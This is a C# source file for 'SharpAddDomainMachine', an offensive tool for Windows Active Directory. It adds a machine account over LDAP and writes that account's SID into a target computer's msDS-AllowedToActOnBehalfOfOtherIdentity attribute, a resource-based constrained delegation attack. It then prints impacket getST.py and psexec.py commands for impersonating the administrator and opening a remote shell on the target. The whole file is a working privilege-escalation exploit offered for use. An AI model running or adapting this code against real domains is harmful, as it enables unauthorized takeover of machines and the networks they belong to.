/*
This code can be complied by csc.exe or Visual Studio.
Supprot.Net 3.5 or later.
Complie:
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe Program.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll
or
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Program.cs /r:System.DirectoryServices.dll,System.DirectoryServices.Protocols.dll
*/
using System;
using System.Text;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.DirectoryServices.Protocols;

namespace SharpAddDomainMachine
{
    class Program
    {

        static void Usage()
        {
            Console.WriteLine("\nSharpAddDomainMachine\r\n");
            Console.WriteLine("SharpAddDomainMachine.exe domain=domain.com dc=192.168.1.1 tm=target_machine_name ma=machine_account mp=machine_pass\n");
            Console.WriteLine("domain:\tSet the target domain.\ndc:\tSet the domain controller to use.\ntm:\tSet the name of the target computer you want to exploit. Need to have write access to the computer object.\nma:\tSet the name of the new machine.(default:random)\nmp:\tSet the password for the new machine.(default:random)\n");
        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }
            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            if (!arguments.ContainsKey("domain") || !arguments.ContainsKey("dc") || !arguments.ContainsKey("tm"))
            {
                Usage();
                return;
            }
            String DomainController = arguments["dc"];
            String Domain = arguments["domain"];
            String new_MachineAccount = "";
            String new_MachineAccount_password = ""; 
            //添加的机器账户
            if (arguments.ContainsKey("ma")) {
                new_MachineAccount = arguments["ma"];
            }else
            {
                new_MachineAccount = RandomString(8);
            }
            //机器账户密码
            if (arguments.ContainsKey("ma"))
            {
                new_MachineAccount_password = arguments["mp"];
            }
            else
            {
                new_MachineAccount_password = RandomString(10);
            }
            
            String victimcomputer = arguments["tm"]; ; //需要进行提权的机器
            String machine_account = new_MachineAccount;
            String sam_account = "";
            String DistinguishedName = "";
            if (machine_account.EndsWith("$"))
            {
                sam_account = machine_account;
                machine_account = machine_account.Substring(0, machine_account.Length - 1);
            }
            else
            {
                sam_account = machine_account + "$";
            }
            String distinguished_name = DistinguishedName;
            String victim_distinguished_name = DistinguishedName;
            String[] DC_array = null;

            distinguished_name = "CN=" + machine_account + ",CN=Computers";
            victim_distinguished_name = "CN=" + victimcomputer + ",CN=Computers";
            DC_array = Domain.Split('.');

            foreach (String DC in DC_array)
            {
                distinguished_name += ",DC=" + DC;
                victim_distinguished_name += ",DC=" + DC;
            }
            Console.WriteLine(victim_distinguished_name);
            Console.WriteLine("[+] Elevate permissions on " + victimcomputer);
            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            Console.WriteLine("[+] New SAMAccountName = " + sam_account);
            //Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
            //连接ldap
            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
            //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
            System.DirectoryServices.Protocols.LdapConnection connection = null;
            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
            connection.SessionOptions.Sealing = true;
            connection.SessionOptions.Signing = true;
            connection.Bind();
            //通过ldap找计算机
            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
            myldapConnection.Path = "LDAP://" + victim_distinguished_name;
            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(CN=" + victimcomputer + ")";
            string[] requiredProperties = new string[] { "samaccountname" };
            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);
            System.DirectoryServices.SearchResult result = null;
            try
            {
                result = search.FindOne();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.Message + "[-] Exiting...");
                return;
            }

            //添加机器并设置资源约束委派
            if (result != null)
            {
                try
                {
                    var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + new_MachineAccount_password + "\"")),
                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
            });
                    //添加机器账户
                    connection.SendRequest(request);
                    Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
                    Console.WriteLine("[-] Exception: " + ex.Message);
                    return;
                }
                // 获取新计算机对象的SID
                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
                SecurityIdentifier sid = null;
                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
                {
                    try
                    {
                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                        Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
                    }
                    catch
                    {
                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
                        return;
                    }
                }
                //设置资源约束委派
                String sec_descriptor = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid.Value + ")";
                RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                byte[] buffer = new byte[sd.BinaryLength];
		        sd.GetBinaryForm (buffer, 0);
                //测试sddl转换结果
                //RawSecurityDescriptor test_back = new RawSecurityDescriptor (buffer, 0);
                //Console.WriteLine(test_back.GetSddlForm(AccessControlSections.All));
                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
               try
                {
                    var change_request = new System.DirectoryServices.Protocols.ModifyRequest();
                    change_request.DistinguishedName = victim_distinguished_name;
                    DirectoryAttributeModification modifymsDS = new DirectoryAttributeModification();
                    modifymsDS.Operation = DirectoryAttributeOperation.Replace;
                    modifymsDS.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity";
                    modifymsDS.Add(buffer);
                    change_request.Modifications.Add(modifymsDS);
                    connection.SendRequest(change_request);
                    Console.WriteLine("[+] Exploit successfully!\n");
                    //打印利用方式
                    Console.WriteLine("[+] Use impacket to get priv!\n\n[+] Command:\n");
                    Console.WriteLine("\ngetST.py -dc-ip {0} {1}/{2}$:{3} -spn cifs/{4}.{5} -impersonate administrator", DomainController, Domain, machine_account, new_MachineAccount_password, victimcomputer, Domain);
                    Console.WriteLine("\nexport KRB5CCNAME=administrator.ccache");
                    Console.WriteLine("\npsexec.py {0}/administrator@{1}.{2} -k -no-pass", Domain, victimcomputer, Domain);
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine("[!] Error: "+ ex.Message + " "+ ex.InnerException);
                    Console.WriteLine("[!] Failed...");
                    return;
                }

            }
        }
    }
}